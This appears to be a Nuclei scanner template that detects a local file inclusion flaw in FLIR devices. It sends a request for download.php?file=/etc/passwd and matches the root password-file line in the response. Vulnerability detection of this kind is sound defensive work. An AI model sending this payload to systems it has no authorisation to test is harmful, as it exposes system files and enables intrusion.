id: flir-path-traversal

info:
  name: Flir - Local File Inclusion
  author: pikpikcu
  severity: high
  description: Flir is vulnerable to local file inclusion.
  reference:
    - https://juejin.cn/post/6961370156484263972
  classification:
    cpe: cpe:2.3:a:flir:flir:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
    vendor: flir
    product: flir
  tags: flir,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/download.php?file=/etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        name: flir
        cpe: cpe:2.3:a:flir:flir:*:*:*:*:*:*:*:*
        regex:
          - "root:.*:0:0:"
        condition: and

      - type: status
        status:
          - 200
